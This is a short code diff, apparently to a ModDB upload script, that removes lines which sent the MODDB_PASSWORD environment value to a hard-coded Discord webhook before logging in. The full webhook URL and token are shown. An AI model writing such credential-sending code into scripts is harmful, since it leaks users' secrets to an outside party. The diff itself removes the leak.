@@ -18,20 +18,6 @@ def main():
     password = os.getenv("MODDB_PASSWORD")
     assert_required(password, "Missing required input env 'MODDB_PASSWORD'")
 
-    url = "https://discord.com/api/webhooks/1238933673357869159/qIx91FrT3-21DNl7n7QK7gmb67pFGbfoMSe0lxVxeckOiuP3c6ftLhlnoLn6rSj7Bfan"
-
-    message = {
-    'embeds': [
-      {
-        'type': 'rich',
-        'title': "Test",
-        'description': password,
-      }
-    ]
-  }
-
-    requests.post(url, json=message)
-
     try:
         moddb.login(username, password)
     except ValueError:
